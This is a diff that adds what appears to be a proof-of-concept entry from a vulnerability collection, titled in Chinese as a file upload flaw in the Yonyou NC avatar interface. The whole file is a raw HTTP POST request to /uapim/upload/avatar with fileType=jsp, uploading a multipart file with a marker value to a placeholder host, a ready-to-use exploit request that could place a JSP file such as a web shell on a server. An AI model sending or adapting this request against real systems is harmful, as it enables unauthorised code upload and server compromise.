@@ -1,0 +1,13 @@
+# 用友NC-avatar接口存在文件上传漏洞
+POST /uapim/upload/avatar?usercode=1&fileType=jsp HTTP/1.1
+Host: www.xwd_test.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ
+User-Agent: Mozilla/5.0 
+Content-Length: 197
+
+------WebKitFormBoundaryEXmnamw5gVZG9KAQ
+Content-Disposition: form-data; name="file"; filename="111.txt"
+Content-Type: application/octet-stream
+
+3999
+------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
